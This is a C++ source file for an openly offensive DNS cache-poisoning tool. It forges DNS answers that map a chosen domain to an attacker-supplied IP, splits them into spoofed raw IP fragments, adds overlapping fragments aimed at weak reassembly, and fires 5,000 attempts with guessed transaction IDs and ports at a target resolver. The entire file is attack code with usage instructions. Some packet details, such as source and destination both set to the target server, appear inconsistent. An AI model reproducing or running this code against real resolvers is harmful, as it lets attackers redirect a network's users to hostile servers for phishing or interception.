// Compile: g++ -o frag_poison frag_poison.cpp
// Run: sudo ./frag_poison <target_dns> <domain> <spoof_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

class FragmentationPoison {
private:
    std::string targetDNS, targetDomain, spoofIP;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    FragmentationPoison(const std::string& dns, const std::string& domain,
                        const std::string& spoof)
        : targetDNS(dns), targetDomain(domain), spoofIP(spoof) {}
    
    // Send spoofed IP fragments that reassemble into malicious DNS response
    // Exploits weak fragment reassembly in OS
    void sendFragments(uint16_t txid, uint16_t dstPort, bool overlap) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        // Build DNS payload
        char dnsPayload[512];
        memset(dnsPayload, 0, sizeof(dnsPayload));
        
        *(uint16_t*)(dnsPayload + 0) = htons(txid);
        *(uint16_t*)(dnsPayload + 2) = htons(0x8180);
        *(uint16_t*)(dnsPayload + 4) = htons(1);
        *(uint16_t*)(dnsPayload + 6) = htons(1);
        
        int pos = 12;
        pos += encodeName(dnsPayload + pos, targetDomain);
        *(uint16_t*)(dnsPayload + pos) = htons(1); pos += 2;
        *(uint16_t*)(dnsPayload + pos) = htons(1); pos += 2;
        
        *(uint16_t*)(dnsPayload + pos) = htons(0xC00C); pos += 2;
        *(uint16_t*)(dnsPayload + pos) = htons(1); pos += 2;
        *(uint16_t*)(dnsPayload + pos) = htons(1); pos += 2;
        *(uint32_t*)(dnsPayload + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dnsPayload + pos) = htons(4); pos += 2;
        struct in_addr addr;
        inet_aton(spoofIP.c_str(), &addr);
        memcpy(dnsPayload + pos, &addr.s_addr, 4); pos += 4;
        
        // Prepend UDP header
        char udpPayload[520];
        struct udphdr* udp = (struct udphdr*)udpPayload;
        udp->source = htons(53);
        udp->dest = htons(dstPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        memcpy(udpPayload + sizeof(struct udphdr), dnsPayload, pos);
        
        int totalLen = sizeof(struct udphdr) + pos;
        uint16_t fragId = rand() & 0xFFFF;
        
        // Fragment size (multiple of 8)
        int fragSize = 16;
        int numFrags = (totalLen + fragSize - 1) / fragSize;
        
        for (int i = 0; i < numFrags; i++) {
            int offset = i * fragSize;
            int thisFragSize = std::min(fragSize, totalLen - offset);
            bool moreFrags = (i < numFrags - 1);
            
            char packet[1500];
            memset(packet, 0, sizeof(packet));
            
            struct iphdr* ip = (struct iphdr*)packet;
            
            ip->ihl = 5;
            ip->version = 4;
            ip->tot_len = sizeof(struct iphdr) + thisFragSize;
            ip->id = htons(fragId);
            // Flags: MF if more fragments, offset in 8-byte units
            ip->frag_off = htons((moreFrags ? 0x2000 : 0) | (offset / 8));
            ip->ttl = 64;
            ip->protocol = IPPROTO_UDP;
            ip->saddr = inet_addr(targetDNS.c_str());
            ip->daddr = inet_addr(targetDNS.c_str());
            ip->check = checksum(ip, sizeof(struct iphdr));
            
            memcpy(packet + sizeof(struct iphdr), udpPayload + offset, thisFragSize);
            
            struct sockaddr_in dest;
            dest.sin_family = AF_INET;
            dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
            
            sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        }
        
        // If overlap mode, send overlapping fragment with different content
        if (overlap) {
            char overlapPacket[1500];
            memset(overlapPacket, 0, sizeof(overlapPacket));
            
            struct iphdr* ip = (struct iphdr*)overlapPacket;
            ip->ihl = 5;
            ip->version = 4;
            ip->tot_len = sizeof(struct iphdr) + 16;
            ip->id = htons(fragId);
            ip->frag_off = htons(0);  // Overlaps first fragment
            ip->ttl = 64;
            ip->protocol = IPPROTO_UDP;
            ip->saddr = inet_addr(targetDNS.c_str());
            ip->daddr = inet_addr(targetDNS.c_str());
            ip->check = checksum(ip, sizeof(struct iphdr));
            
            // Different content that reassembles to malicious
            memcpy(overlapPacket + sizeof(struct iphdr), udpPayload, 16);
            
            struct sockaddr_in dest;
            dest.sin_family = AF_INET;
            dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
            
            sendto(sock, overlapPacket, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        }
        
        close(sock);
    }
    
    void run(int attempts) {
        std::cout << "[*] Fragmentation poisoning attack starting...\n";
        for (int i = 0; i < attempts; i++) {
            uint16_t txid = rand() & 0xFFFF;
            uint16_t port = 1024 + (rand() % 64000);
            sendFragments(txid, port, i % 2 == 0);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <target_dns> <domain> <spoof_ip>\n";
        return 1;
    }
    srand(time(NULL));
    FragmentationPoison poison(argv[1], argv[2], argv[3]);
    poison.run(5000);
    return 0;
}
